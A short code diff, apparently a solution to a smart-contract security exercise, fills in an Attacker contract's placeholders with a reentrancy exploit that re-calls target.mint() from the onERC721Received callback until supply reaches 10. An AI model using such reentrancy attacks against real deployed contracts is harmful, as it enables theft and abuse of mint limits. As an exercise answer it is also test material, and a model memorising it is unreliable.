@@ -20,14 +20,14 @@ contract Attacker {
 		uint256, 
 		bytes calldata
 	) external returns(bytes4) {
-        /*
-            Your code goes here!
-        */
+    while(target.totalSupply() != 10){
+			target.mint();
+		}
 		return this.onERC721Received.selector;
 	}
 
     function exploit() external {
-		
+			target.mint();
 		/*
             Your code goes here!
         */
